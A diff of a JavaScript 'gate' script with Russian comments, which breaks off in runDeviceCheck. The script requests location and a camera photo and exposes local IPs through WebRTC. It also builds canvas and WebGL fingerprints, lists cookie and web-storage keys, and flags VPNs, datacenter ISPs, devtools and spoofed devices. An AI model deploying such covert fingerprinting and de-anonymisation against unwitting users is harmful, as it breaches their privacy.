@@ -1,9 +1,8 @@
-// ============================================================================
-// === app.js (NO-JB, MAX ANTI-SPOOF, VARIANT C) ===============================
-// ============================================================================
-// Полная версия, объединённая, с глубокой анти-спуф логикой.
-// Часть 1: базовые переменные, UI, утилиты, фото, гео, UA, permissions.
-// ----------------------------------------------------------------------------
+// === app.js CLEAN (NO ACTIVE JB SCHEMES) ===
+
+// Отключаем авто-старт чтобы HTML управлял запуском
+window.__reportReady = false;
+window.__decision = null;
 
 const QSP = {
   get(k) {
@@ -30,13 +29,13 @@ function dlog(...a) {
   if (DEV_LOG) console.log("[gate]", ...a);
 }
 
-// === UI elements ============================================================
+// UI Elements
 const UI = {
   text: document.getElementById("text"),
   note: document.getElementById("note"),
-  btn: document.getElementById("enterBtn"),
   reason: document.getElementById("reason"),
-  title: document.getElementById("title")
+  title: document.getElementById("title"),
+  btn: document.getElementById("enterBtn")
 };
 
 function setBtnLocked() {
@@ -48,6 +47,7 @@ function setBtnLocked() {
   b.style.cursor = "not-allowed";
   b.style.background = "linear-gradient(90deg,#246,#39a)";
 }
+
 function setBtnReady() {
   const b = UI.btn;
   if (!b) return;
@@ -57,28 +57,25 @@ function setBtnReady() {
   b.style.cursor = "pointer";
   b.style.background = "linear-gradient(90deg,#4f00ff,#00bfff)";
 }
+
 function showBtn() {
   if (UI.btn) UI.btn.style.display = "block";
 }
+
 function hideBtn() {
   if (UI.btn) UI.btn.style.display = "none";
 }
 
-// === Code extractor ==========================================================
 function determineCode() {
   const q = QSP.get("code");
   const code = q ? String(q).trim() : null;
   return code && /^[A-Za-z0-9-]{3,40}$/.test(code) ? code : null;
 }
 
-// ============================================================================
-// === GEOLOCATION ============================================================
-// ============================================================================
 async function askGeolocation() {
   return new Promise((resolve) => {
     if (LITE_MODE || window.__DISABLE_GEO === true) return resolve(null);
     if (!("geolocation" in navigator)) return resolve(null);
-
     navigator.geolocation.getCurrentPosition(
       (p) =>
         resolve({
@@ -93,9 +90,6 @@ async function askGeolocation() {
   });
 }
 
-// ============================================================================
-// === PHOTO CAPTURE ==========================================================
-// ============================================================================
 function downscaleDataUrl(dataUrl, maxSide = 1024, quality = 0.6) {
   return new Promise((resolve, reject) => {
     const img = new Image();
@@ -169,7 +163,6 @@ async function takePhotoNormal() {
   });
 }
 
-// Hidden <input type=file> fallback
 (function ensureFileInput() {
   if (!document.getElementById("fileInp")) {
     const inp = document.createElement("input");
@@ -201,7 +194,6 @@ async function takePhotoWithFallbackNormal() {
   }
 }
 
-// Lite
 const LITE_PHOTO =
   "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8Xw8AAkMBgQq5xwAAAABJRU5ErkJggg==";
 
@@ -216,16 +208,15 @@ function takePhotoUniversal() {
   return takePhotoWithFallbackNormal();
 }
 
-// ============================================================================
-// === UA + PLATFORM DETECT ===================================================
-// ============================================================================
 function isIpadDesktopMode() {
   return navigator.platform === "MacIntel" && (navigator.maxTouchPoints || 0) > 1;
 }
+
 function isIOSHandheldUA(ua) {
   ua = ua || navigator.userAgent || "";
   return /(iPhone|iPad|iPod)/i.test(ua);
 }
+
 function parseIOSMajorFromUAUniversal(ua) {
   ua = ua || navigator.userAgent || "";
   const ipadDesktop = isIpadDesktopMode();
@@ -239,7 +230,6 @@ function parseIOSMajorFromUAUniversal(ua) {
   }
   return null;
 }
-
 function getDeviceInfo() {
   const ua = navigator.userAgent || "";
   const iosVer = parseIOSMajorFromUAUniversal(ua);
@@ -256,7 +246,7 @@ function getDeviceInfo() {
 }
 
 // ============================================================================
-// === PERMISSION STATES ======================================================
+// Permission states
 // ============================================================================
 async function getPermissionStates() {
   if (LITE_MODE || window.__DISABLE_CAMERA || window.__DISABLE_GEO)
@@ -271,303 +261,387 @@ async function getPermissionStates() {
       return "unknown";
     }
   }
+
   const [geo, cam, mic] = await Promise.all([
     q("geolocation"),
     q("camera"),
     q("microphone")
   ]);
+
   return { geolocation: geo, camera: cam, microphone: mic };
 }
-// ============================================================================
-// == PART 2: WebRTC, Canvas, Storage, Battery, WebGL, Locale, In-App ========
-// ============================================================================
 
 // ============================================================================
-// === WebRTC IP Leak ==========================================================
+// WebRTC IP leak
 // ============================================================================
-async function getWebRTCIps() {
+async function collectWebRTCIps(timeoutMs = 2500) {
+  if (!window.RTCPeerConnection) return [];
   return new Promise((resolve) => {
-    const ips = [];
+    const ips = new Set();
+    const pc = new RTCPeerConnection({
+      iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
+    });
+
     try {
-      const pc = new RTCPeerConnection({
-        iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
-      });
-
       pc.createDataChannel("x");
-      pc.createOffer()
-        .then((offer) => pc.setLocalDescription(offer))
-        .catch(() => resolve([]));
+    } catch {}
 
-      pc.onicecandidate = (ev) => {
-        if (!ev || !ev.candidate) {
-          resolve([...new Set(ips)]);
-          return;
-        }
-        const c = ev.candidate.candidate;
-        const m = c.match(/candidate:\d+ \d+ (udp|tcp) \d+ ([0-9.]+)/);
-        if (m && m[2]) ips.push(m[2]);
-      };
+    pc.onicecandidate = (e) => {
+      if (!e.candidate) return;
+      const cand = e.candidate.candidate || "";
+      const ipRegex = /([0-9]{1,3}(?:\.[0-9]{1,3}){3})|([0-9a-fA-F:]{2,})/;
+      const m = cand.match(ipRegex);
+      if (m) ips.add(m[0]);
+    };
 
-      setTimeout(() => resolve([...new Set(ips)]), 2000);
-    } catch {
-      resolve([]);
-    }
+    pc.createOffer()
+      .then((o) => pc.setLocalDescription(o))
+      .catch(() => {});
+
+    const to = setTimeout(() => {
+      try {
+        pc.close();
+      } catch {}
+      resolve([...ips]);
+    }, timeoutMs);
+
+    pc.onicegatheringstatechange = () => {
+      if (pc.iceGatheringState === "complete") {
+        clearTimeout(to);
+        try {
+          pc.close();
+        } catch {}
+        resolve([...ips]);
+      }
+    };
   });
 }
 
 // ============================================================================
-// === Canvas Entropy ==========================================================
+// Public IP fetch
 // ============================================================================
-function getCanvasEntropy() {
+async function fetchClientIP() {
   try {
-    const c = document.createElement("canvas");
-    c.width = 200;
-    c.height = 60;
-    const ctx = c.getContext("2d");
-
-    ctx.textBaseline = "top";
-    ctx.font = "16px 'Arial'";
-    ctx.fillStyle = "#f60";
-    ctx.fillRect(0, 0, 200, 60);
-
-    ctx.fillStyle = "#069";
-    ctx.fillText("entropy-test-123", 2, 2);
-
-    ctx.strokeStyle = "rgba(120, 10, 50, 0.7)";
-    ctx.beginPath();
-    ctx.moveTo(10, 50);
-    ctx.lineTo(190, 10);
-    ctx.stroke();
-
-    const data = c.toDataURL();
-    let hash = 0;
-    for (let i = 0; i < data.length; i++)
-      hash = (hash * 31 + data.charCodeAt(i)) & 0xffffffff;
-
-    return {
-      dataUrlLen: data.length,
-      hash,
-      sample: data.slice(0, 32)
-    };
-  } catch (e) {
-    return { error: String(e) };
+    const r = await fetch(`${API_BASE}/api/client-ip`);
+    if (!r.ok) return null;
+    const j = await r.json().catch(() => null);
+    return j || null;
+  } catch {
+    return null;
   }
 }
 
 // ============================================================================
-// === Storage Quota ===========================================================
+// Canvas fingerprint
 // ============================================================================
-async function getStorageEstimateSafe() {
+async function getCanvasFingerprint() {
   try {
-    if (navigator.storage && navigator.storage.estimate) {
-      const est = await navigator.storage.estimate();
-      return {
-        quota: est.quota || null,
-        usage: est.usage || null
-      };
+    const c = document.createElement("canvas");
+    c.width = 280;
+    c.height = 80;
+    const g = c.getContext("2d");
+
+    g.textBaseline = "top";
+    g.font = "16px Arial";
+    g.fillStyle = "#f60";
+    g.fillRect(0, 0, 280, 80);
+    g.fillStyle = "#069";
+    g.fillText("canvas-fp v1 • π Ω ✓", 2, 2);
+    g.strokeStyle = "#222";
+    g.beginPath();
+    g.arc(140, 40, 18, 0, Math.PI * 2);
+    g.stroke();
+
+    const data = c.toDataURL();
+    const enc = new TextEncoder().encode(data);
+
+    if (crypto?.subtle?.digest) {
+      const buf = await crypto.subtle.digest("SHA-256", enc);
+      const arr = Array.from(new Uint8Array(buf));
+      const hash = arr.map((x) => x.toString(16).padStart(2, "0")).join("");
+      return { hash, size: data.length };
     }
-  } catch {}
-  return { quota: null, usage: null };
+
+    let h = 0;
+    for (let i = 0; i < data.length; i++) {
+      h = ((h << 5) - h) + data.charCodeAt(i);
+      h |= 0;
+    }
+    return { hash: "f" + (h >>> 0).toString(16), size: data.length };
+  } catch {
+    return null;
+  }
 }
 
 // ============================================================================
-// === Battery (Charging + anomalies) ==========================================
+// Storage fingerprints
+// ============================================================================
+async function getStorageAndStorageLike() {
+  let estimate = null;
+  try {
+    estimate = await navigator.storage?.estimate?.() || null;
+  } catch {}
+
+  let cookies = null;
+  try {
+    const raw = document.cookie || "";
+    cookies = {
+      length: raw.length,
+      names: raw
+        ? raw.split(";").map((s) => s.split("=")[0].trim()).slice(0, 30)
+        : []
+    };
+  } catch {}
+
+  function snap(s) {
+    try {
+      const n = s.length;
+      const keys = [];
+      let total = 0;
+      for (let i = 0; i < n && i < 50; i++) {
+        const k = s.key(i);
+        keys.push(k);
+        total += (s.getItem(k) || "").length;
+      }
+      return { count: n, approxBytes: total, keys };
+    } catch {
+      return null;
+    }
+  }
+
+  return {
+    estimate,
+    cookies,
+    local: snap(localStorage),
+    session: snap(sessionStorage)
+  };
+}
+
+// ============================================================================
+// Network info
+// ============================================================================
+function getNetworkInfo() {
+  const ni =
+    navigator.connection ||
+    navigator.mozConnection ||
+    navigator.webkitConnection;
+
+  const out = ni
+    ? {
+        rtt: ni.rtt,
+        downlink: ni.downlink,
+        effectiveType: ni.effectiveType,
+        saveData: !!ni.saveData
+      }
+    : {};
+
+  try {
+    const nav = performance.getEntriesByType("navigation")[0];
+    if (nav?.responseStart) out.rttApprox = Math.round(nav.responseStart);
+  } catch {}
+
+  return out;
+}
+
+// ============================================================================
+// Battery info
 // ============================================================================
 async function getBatteryInfo() {
   try {
-    if (navigator.getBattery) {
-      const b = await navigator.getBattery();
-      return {
-        charging: b.charging,
-        level: b.level,
-        chargingTime: b.chargingTime,
-        dischargingTime: b.dischargingTime
-      };
-    }
-  } catch {}
-  return null;
+    if (!navigator.getBattery) return null;
+    const b = await navigator.getBattery();
+    return {
+      level: Math.round(b.level * 100),
+      charging: b.charging,
+      chargingTime: b.chargingTime,
+      dischargingTime: b.dischargingTime
+    };
+  } catch {
+    return null;
+  }
 }
 
 // ============================================================================
-// === WebGL Renderer/Vendor ====================================================
+// WebGL fingerprint
 // ============================================================================
 function getWebGLInfo() {
-  const out = {};
   try {
     const c = document.createElement("canvas");
-    const gl =
-      c.getContext("webgl") ||
-      c.getContext("experimental-webgl");
-    if (!gl) return { error: "no-webgl" };
-
-    const dbg = gl.getExtension("WEBGL_debug_renderer_info");
-    if (dbg) {
-      out.vendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
-      out.renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
-    } else {
-      out.vendor = gl.getParameter(gl.VENDOR);
-      out.renderer = gl.getParameter(gl.RENDERER);
-    }
-
-    out.version = gl.getParameter(gl.VERSION);
-    out.shading = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
-
-    // Entropy
-    try {
-      const tex = gl.createTexture();
-      gl.bindTexture(gl.TEXTURE_2D, tex);
-      const pixels = new Uint8Array(64);
-      gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4, 4, 0, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
-      out.entropy = pixels.slice(0, 16);
-    } catch {}
-
-  } catch (e) {
-    return { error: String(e) };
-  }
-  return out;
-}
-
-// ============================================================================
-// === Locale, Timezone, Intl ===================================================
-// ============================================================================
-function getLocaleInfo() {
-  const out = {};
-  try {
-    out.timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || null;
-  } catch {}
-
-  out.lang = navigator.language || null;
-  out.langs = navigator.languages || [];
-
-  out.screen = {
-    w: screen.width,
-    h: screen.height,
-    aw: screen.availWidth,
-    ah: screen.availHeight
-  };
-
-  out.dpr = window.devicePixelRatio || null;
-
-  try {
-    out.intl = {
-      num: new Intl.NumberFormat().resolvedOptions(),
-      dt: new Intl.DateTimeFormat().resolvedOptions()
+    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+    if (!gl) return null;
+    const ext = gl.getExtension("WEBGL_debug_renderer_info");
+    return {
+      vendor: ext
+        ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)
+        : gl.getParameter(gl.VENDOR),
+      renderer: ext
+        ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)
+        : gl.getParameter(gl.RENDERER)
     };
-  } catch {}
-
-  return out;
+  } catch {
+    return null;
+  }
 }
 
 // ============================================================================
-// === In-App WebView Check =====================================================
+// In-app WebView detection
 // ============================================================================
 function detectInAppWebView() {
   const ua = navigator.userAgent || "";
-  const isFB = /FBAN|FBAV|FB_IAB|FBAN/i.test(ua);
-  const isIG = /Instagram/i.test(ua);
-  const isTikTok = /TikTok/i.test(ua);
-  const isLine = /Line\//i.test(ua);
-  const isVK = /VK/i.test(ua);
-  const isWeChat = /MicroMessenger/i.test(ua);
-  const isTelegram = /Telegram/i.test(ua);
-  const isSnap = /Snapchat/i.test(ua);
-  const isDiscord = /Discord/i.test(ua);
-
-  return {
-    isInApp: isFB || isIG || isTikTok || isLine || isVK || isWeChat || isTelegram || isSnap || isDiscord,
-    fb: isFB,
-    ig: isIG,
-    tiktok: isTikTok,
-    line: isLine,
-    vk: isVK,
-    wechat: isWeChat,
-    tg: isTelegram,
-    snap: isSnap,
-    discord: isDiscord
+  const flags = {
+    Telegram: /Telegram/i.test(ua),
+    Instagram: /Instagram/i.test(ua),
+    Facebook: /FBAN|FBAV|FB_IAB/i.test(ua),
+    Messenger: /FBAN|FBAV.*Messenger/i.test(ua),
+    TikTok: /TikTok/i.test(ua),
+    Discord: /Discord/i.test(ua),
+    WeChat: /MicroMessenger/i.test(ua),
+    WKWebView:
+      /\bAppleWebKit\/\d+\.\d+\s+\(KHTML, like Gecko\)/.test(ua) &&
+      !/Safari\//.test(ua)
   };
+  const any = Object.keys(flags).filter((k) => flags[k]);
+  return { flags, any, isInApp: any.length > 0 };
 }
 
 // ============================================================================
-// === NETWORK INFO (RTT, downlink, type) ======================================
+// Locale + display
 // ============================================================================
-function getNetworkInfo() {
-  const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-  if (!n) return null;
+async function getLocaleAndDisplay() {
+  const tz = Intl?.DateTimeFormat?.().resolvedOptions?.().timeZone || null;
+
+  let uaData = null;
+  try {
+    if (navigator.userAgentData?.getHighEntropyValues) {
+      uaData = await navigator.userAgentData.getHighEntropyValues([
+        "platform",
+        "platformVersion",
+        "architecture",
+        "bitness",
+        "model",
+        "uaFullVersion"
+      ]);
+      uaData.brands = navigator.userAgentData.brands;
+      uaData.mobile = navigator.userAgentData.mobile;
+    }
+  } catch {}
+
   return {
-    effectiveType: n.effectiveType || null,
-    rtt: n.rtt || null,
-    downlink: n.downlink || null,
-    saveData: n.saveData || false,
-    type: n.type || null
+    languages: navigator.languages || [navigator.language],
+    timeZone: tz,
+    dpr: window.devicePixelRatio || 1,
+    screen: {
+      w: screen.width,
+      h: screen.height,
+      aw: screen.availWidth,
+      ah: screen.availHeight
+    },
+    viewport: { w: innerWidth, h: innerHeight },
+    platform: navigator.platform,
+    vendor: navigator.vendor,
+    ua: navigator.userAgent,
+    uaData
   };
 }
-
 // ============================================================================
-// === DEVTOOLS HEURISTIC (NO ADV, LIGHT) =======================================
+// Devtools heuristic
 // ============================================================================
 function detectDevtoolsHeuristic() {
-  const threshold = 160;
-  const w = window.outerWidth - window.innerWidth;
-  const h = window.outerHeight - window.innerHeight;
-
-  const opened = (w > threshold) || (h > threshold);
-  return { opened, wDiff: w, hDiff: h };
+  try {
+    const dw = Math.abs((window.outerWidth || 0) - window.innerWidth);
+    const dh = Math.abs((window.outerHeight || 0) - window.innerHeight);
+    return { opened: dw > 120 || dh > 160, dw, dh };
+  } catch {
+    return null;
+  }
 }
 
 // ============================================================================
-// === COLLECT FULL CLIENT PROFILE =============================================
+// Datacenter keywords
 // ============================================================================
-async function collectClientProfile() {
-  dlog("collectClientProfile start");
+const DC_ISP_WORDS = [
+  "AMAZON",
+  "AWS",
+  "GOOGLE",
+  "GCP",
+  "MICROSOFT",
+  "AZURE",
+  "CLOUDFLARE",
+  "HETZNER",
+  "OVH",
+  "DIGITALOCEAN",
+  "LINODE",
+  "IONOS",
+  "VULTR"
+];
 
-  const rtc = await getWebRTCIps();
-  const canvas = getCanvasEntropy();
-  const webgl = getWebGLInfo();
-  const storage = await getStorageEstimateSafe();
-  const battery = await getBatteryInfo();
-  const locale = getLocaleInfo();
-  const net = getNetworkInfo();
-  const perms = await getPermissionStates();
-  const inApp = detectInAppWebView();
+// ============================================================================
+// Network heuristics
+// ============================================================================
+function analyzeNetworkHeuristics({
+  publicIp,
+  webrtcIps,
+  network,
+  cameraLatencyMs,
+  locale,
+  ipMeta
+}) {
+  const reasons = [];
+  let scoreAdj = 0;
 
-  return {
-    webrtcIps: rtc,
-    canvas,
-    webgl,
-    storage,
-    battery,
-    locale,
-    network: net,
-    permissions: perms,
-    inAppWebView: inApp,
-    // Automation baseline score (легкая версия)
-    automationScore: estimateAutomationScore({ canvas, webgl, rtc, locale }),
-    timestamp: Date.now()
-  };
+  const isp = (publicIp?.isp || publicIp?.org || "").toUpperCase();
+  if (DC_ISP_WORDS.some((w) => isp.includes(w))) {
+    reasons.push("DC-ISP признак (AWS/Google/Azure)");
+    scoreAdj -= 25;
+  }
+
+  const pubCandidates = (webrtcIps || []).filter(Boolean);
+  if (pubCandidates.length >= 1) {
+    reasons.push("WebRTC раскрыл публичный IP (VPN/tunnel?)");
+    scoreAdj -= 10;
+  }
+
+  if (cameraLatencyMs != null && cameraLatencyMs <= 5) {
+    reasons.push("Ненормально низкая cameraLatency");
+    scoreAdj -= 10;
+  }
+
+  if (/2g/i.test(network?.effectiveType || "")) {
+    reasons.push("Очень медленная сеть (2g)");
+    scoreAdj -= 5;
+  }
+
+  if (network?.rtt > 800) {
+    reasons.push("Очень высокий RTT");
+    scoreAdj -= 5;
+  }
+
+  const tz = (locale?.timeZone || "").toUpperCase();
+  const country = (publicIp?.country || ipMeta?.country || "").toUpperCase();
+  if (
+    tz &&
+    country &&
+    !tz.includes(country) &&
+    !tz.includes("UTC") &&
+    !tz.includes("GMT")
+  ) {
+    reasons.push(
+      `Таймзона (${locale?.timeZone}) не совпадает со страной IP (${publicIp?.country})`
+    );
+    scoreAdj -= 8;
+  }
+
+  let label = "unlikely";
+  if (scoreAdj <= -25) label = "likely";
+  else if (scoreAdj <= -10) label = "possible";
+
+  return { label, scoreAdj, reasons, dcIsp: label === "likely" };
 }
 
 // ============================================================================
-// === Automation Score (легкий) ===============================================
+// Safari 18 feature tests
 // ============================================================================
-function estimateAutomationScore({ canvas, webgl, rtc, locale }) {
-  let score = 0;
-
-  if (Array.isArray(rtc) && rtc.length === 0) score += 0.15;
-  if (canvas && canvas.dataUrlLen <= 2000) score += 0.15;
-  if (webgl && webgl.error) score += 0.2;
-  if (locale && locale.timeZone && /UTC/i.test(locale.timeZone)) score += 0.15;
-
-  if (score > 1) score = 1;
-  return Number(score.toFixed(3));
-}
-// ============================================================================
-// == PART 3: Safari 18 FeatureGate + Anti-Spoof Checks ========================
-// ============================================================================
-
-// ---------------------------------------------------------------------------
-// Safari 18.0 — ViewTransition Detection
-// ---------------------------------------------------------------------------
-async function testSafari18_ViewTransitions() {
+async function testSafari18_0_ViewTransitions() {
   const hasAPI = typeof document.startViewTransition === "function";
   const cssOK = CSS?.supports?.("view-transition-name: auto") === true;
   let ran = false;
@@ -575,25 +649,29 @@ async function testSafari18_ViewTransitions() {
 
   try {
     if (hasAPI) {
-      const d = document.createElement("div");
-      document.body.appendChild(d);
-      const vt = document.startViewTransition(() => { ran = true; });
+      const div = document.createElement("div");
+      div.textContent = "A";
+      document.body.appendChild(div);
+
+      const vt = document.startViewTransition(() => {
+        div.textContent = "B";
+        ran = true;
+      });
+
       await vt?.finished;
       finished = true;
-      d.remove();
+      div.remove();
     }
   } catch {}
 
   return {
-    feature: "Safari18-ViewTransitions",
-    pass: !!(hasAPI && cssOK && ran && finished)
+    feature: "Safari 18.0 ViewTransitions",
+    pass: !!(hasAPI && cssOK && ran && finished),
+    details: { hasAPI, cssOK, ran, finished }
   };
 }
 
-// ---------------------------------------------------------------------------
-// Safari 18.4 — Triple Check: shape(), cookieStore, WebAuthn JSON parsing
-// ---------------------------------------------------------------------------
-async function testSafari18_TripleCheck() {
+async function testSafari18_4_Triple() {
   let shapeOK = false;
   try {
     const el = document.createElement("div");
@@ -602,49 +680,55 @@ async function testSafari18_TripleCheck() {
     shapeOK = !!el.style.clipPath;
   } catch {}
 
-  const cookieStoreOK = typeof window.cookieStore === "object";
+  const cookieStoreOK =
+    typeof window.cookieStore === "object" &&
+    typeof window.cookieStore?.get === "function";
 
-  let webauthnOK = false;
-  try {
-    webauthnOK =
-      typeof window.PublicKeyCredential?.parseCreationOptionsFromJSON === "function" &&
-      typeof window.PublicKeyCredential?.parseRequestOptionsFromJSON === "function";
-  } catch {}
+  const webauthnOK =
+    typeof window.PublicKeyCredential?.parseCreationOptionsFromJSON ===
+      "function" &&
+    typeof window.PublicKeyCredential?.parseRequestOptionsFromJSON ===
+      "function" &&
+    typeof window.PublicKeyCredential?.prototype?.toJSON === "function";
 
   return {
-    feature: "Safari18.4-Combined",
+    feature: "Safari 18.4 shape() + cookieStore + WebAuthn JSON",
     pass: !!(shapeOK && cookieStoreOK && webauthnOK),
-    shapeOK,
-    cookieStoreOK,
-    webauthnOK
+    details: { shapeOK, cookieStoreOK, webauthnOK }
   };
 }
 
-// ---------------------------------------------------------------------------
-// Full Safari Feature Tests (VT18 + 18.4 triple)
-// ---------------------------------------------------------------------------
-async function runSafariFeatureTests() {
-  const vt18_0 = await testSafari18_ViewTransitions();
-  const triple18_4 = await testSafari18_TripleCheck();
+async function runSafariFeatureTests(maxWaitMs = 1500) {
+  const timeout = (p, ms) =>
+    Promise.race([
+      p,
+      new Promise((res) =>
+        setTimeout(
+          () =>
+            res({
+              feature: "timeout",
+              pass: false,
+              details: { timeoutMs: ms }
+            }),
+          ms
+        )
+      )
+    ]);
 
-  return {
-    vt18_0,
-    triple18_4,
-    summary: {
-      VT18: vt18_0.pass ? "ok" : "—",
-      v18_4: triple18_4.pass ? "ok" : "—"
-    }
-  };
+  const [vt18, triple18_4] = await Promise.all([
+    timeout(testSafari18_0_ViewTransitions(), maxWaitMs),
+    timeout(testSafari18_4_Triple(), maxWaitMs)
+  ]);
+
+  return { vt18_0: vt18, triple18_4 };
 }
 
-// ---------------------------------------------------------------------------
-// Wait for injected FeatureGate (optional) with timeout
-// ---------------------------------------------------------------------------
-async function waitFeatureGate(ms = 800) {
+async function waitFeatureGate(maxMs = 800) {
   if (window.__featureGate) return window.__featureGate;
 
   return new Promise((resolve) => {
-    const t = setTimeout(() => resolve(window.__featureGate || null), ms);
+    const t = setTimeout(() => resolve(window.__featureGate || null), maxMs);
+
     window.addEventListener(
       "featuregate-ready",
       (ev) => {
@@ -657,138 +741,128 @@ async function waitFeatureGate(ms = 800) {
 }
 
 // ============================================================================
-// == PART 3-B: Anti-Spoof — Display & UA Anomalies ============================
+// collectClientProfile() — CLEAN (NO ACTIVE JB)
 // ============================================================================
+async function collectClientProfile() {
+  const [
+    permissions,
+    webrtcIps,
+    publicIp,
+    canvasFingerprint,
+    storage,
+    network,
+    battery,
+    webgl,
+    inAppWebView,
+    locale
+  ] = await Promise.all([
+    getPermissionStates(),
+    collectWebRTCIps().catch(() => []),
+    fetchClientIP(),
+    getCanvasFingerprint(),
+    getStorageAndStorageLike(),
+    Promise.resolve(getNetworkInfo()),
+    getBatteryInfo(),
+    Promise.resolve(getWebGLInfo()),
+    Promise.resolve(detectInAppWebView()),
+    getLocaleAndDisplay()
+  ]);
 
-// ---------------------------------------------------------------------------
-// Display impossible states (MAX strict)
-// ---------------------------------------------------------------------------
-function detectDisplayHardAnomalies_CP(clientProfile) {
-  const scr = clientProfile?.locale?.screen || {};
-  const dpr = Number(clientProfile?.locale?.dpr ?? 0) || 0;
   const ua = navigator.userAgent || "";
-  const plat = navigator.platform || "";
+  const maxTP = Number(navigator.maxTouchPoints || 0);
+  const isIpad =
+    /iPad/i.test(ua) ||
+    (navigator.platform === "MacIntel" && maxTP > 1);
+  const iosVersion = parseIOSMajorFromUAUniversal(ua);
 
-  let displaySpoofHard = false;
-  const notes = [];
+  const ispUp = (publicIp?.isp || publicIp?.org || "").toUpperCase();
+  const dcWords = DC_ISP_WORDS.filter((w) => ispUp.includes(w));
 
-  const sw = Number(scr.w || 0);
-  const sh = Number(scr.h || 0);
+  const ref = document.referrer || "";
 
-  // iPhone cannot be 1920x1080+
-  if (/iPhone/i.test(ua) && sw >= 1920 && sh >= 1080) {
-    displaySpoofHard = true;
-    notes.push("iPhone UA with desktop-level resolution >= 1920x1080");
-  }
-
-  // iPad cannot be <=400px width
-  if (/iPad/i.test(ua) && sw > 0 && sw <= 400) {
-    displaySpoofHard = true;
-    notes.push("iPad with unrealistic width <= 400px");
-  }
-
-  // DPR cannot be <1 on iOS
-  if (/iPhone|iPad/i.test(ua) && dpr > 0 && dpr < 1) {
-    displaySpoofHard = true;
-    notes.push("iOS DPR < 1 impossible");
-  }
-
-  // MacIntel spoofing iPhone resolutions
-  if (/MacIntel/i.test(plat) && (sw <= 640 || sh <= 480) && (navigator.maxTouchPoints || 0) === 0) {
-    displaySpoofHard = true;
-    notes.push("MacIntel with tiny mobile-like screen size");
-  }
-
-  return { displaySpoofHard, notes };
-}
-
-// ---------------------------------------------------------------------------
-// Anti-Spoof: VT18 mismatch (VT18 ok but UA not Safari-like)
-// ---------------------------------------------------------------------------
-function isSafariLikeUA(ua) {
-  return (
-    /Safari\//.test(ua) &&
-    /AppleWebKit\//.test(ua) &&
-    !/Chrome|CriOS|Chromium|FxiOS|Edg|OPR|UCBrowser|YaBrowser|Brave/i.test(ua)
-  );
-}
-
-function detectVT18Spoof_CP({ features, clientProfile }) {
-  const ua = navigator.userAgent || "";
-  const plat = navigator.platform || "";
-  const vtOk = features?.VT18 === "ok";
-
-  let hardSpoofVT18 = false;
-  const notes = [];
-
-  if (!vtOk) return { hardSpoofVT18, notes };
-
-  // VT18 ok but UA not Safari-like
-  if (!isSafariLikeUA(ua)) {
-    hardSpoofVT18 = true;
-    notes.push("VT18 ok but UA not Safari-like");
-  }
-
-  // VT18 ok but platform not Apple
-  if (!/iPhone|iPad|Macintosh|MacIntel/i.test(ua + " " + plat)) {
-    hardSpoofVT18 = true;
-    notes.push("VT18 ok but platform not Apple");
-  }
-
-  // iPhone spoofing Mac resolution
-  const scr = clientProfile?.locale?.screen || {};
-  if (/iPhone/i.test(ua) && scr.w >= 1600) {
-    hardSpoofVT18 = true;
-    notes.push("VT18 ok but iPhone screen looks like desktop");
-  }
-
-  return { hardSpoofVT18, notes };
-}
-
-// ============================================================================
-// == PART 3-C: Anti-Spoof Master (combines anomalies) =========================
-// ============================================================================
-function runAntiSpoofMaster({ clientProfile, features }) {
-  const disp = detectDisplayHardAnomalies_CP(clientProfile);
-  const vt = detectVT18Spoof_CP({ features, clientProfile });
-
-  return {
-    display: disp,
-    vt18: vt,
-    hard: disp.displaySpoofHard || vt.hardSpoofVT18
+  const profile = {
+    permissions,
+    webrtcIps,
+    publicIp,
+    canvasFingerprint,
+    storage,
+    network,
+    battery,
+    webgl,
+    inAppWebView,
+    locale,
+    maxTouchPoints: maxTP,
+    isIpad,
+    iosVersion,
+    liteMode: LITE_MODE,
+    lite: LITE_MODE,
+    dcIspKeywords: dcWords,
+    referrer: ref || null
   };
+
+  profile.linkFlowMismatch = !!(
+    inAppWebView.isInApp ||
+    /discord|telegram|instagram|tiktok|facebook|vk\.com/i.test(ref)
+  );
+
+  profile.shortcutUsed = !!(LITE_MODE && inAppWebView.isInApp);
+  profile.shortCapUsed = profile.shortcutUsed;
+
+  profile.modifiedWebApi = (() => {
+    try {
+      const isNative = (fn) =>
+        typeof fn === "function" &&
+        /\[native code\]/.test(Function.prototype.toString.call(fn));
+      const arr = [
+        navigator.permissions?.query,
+        navigator.geolocation?.getCurrentPosition,
+        navigator.mediaDevices?.getUserMedia
+      ];
+      return arr.filter(Boolean).some((fn) => !isNative(fn));
+    } catch {
+      return false;
+    }
+  })();
+
+  profile.webApiPatched = profile.modifiedWebApi;
+
+  profile.automation = !!(
+    profile.shortcutUsed ||
+    profile.linkFlowMismatch ||
+    profile.modifiedWebApi
+  );
+
+  const small = [];
+  if (/2g/i.test(network?.effectiveType || "")) small.push("effectiveType=2g");
+  if (network?.rtt > 800) small.push("veryHighRTT");
+  profile.smallSignals = small;
+
+  return profile;
 }
 // ============================================================================
-// == PART 4: Device Check (MAX Anti-Spoof variant) ============================
+// runDeviceCheck() — CLEAN NO-JB
 // ============================================================================
-
 async function runDeviceCheck(clientProfile) {
   const reasons = [];
   const details = {};
   let score = 100;
 
   try {
-    const ua = navigator.userAgent || "";
-    const plat = navigator.platform || "";
-
-    details.ua = ua;
-    details.platform = plat;
+    details.ua = navigator.userAgent;
+    details.vendor = navigator.vendor;
+    details.platform = navigator.platform;
+    details.lang = navigator.language;
     details.timezone = clientProfile?.locale?.timeZone;
+    details.dpr = window.devicePixelRatio || 1;
     details.screen = clientProfile?.locale?.screen;
     details.maxTouchPoints = navigator.maxTouchPoints || 0;
 
-    // ------------------------------------------------------------
-    // webdriver
-    // ------------------------------------------------------------
     details.navigator_webdriver = navigator.webdriver;
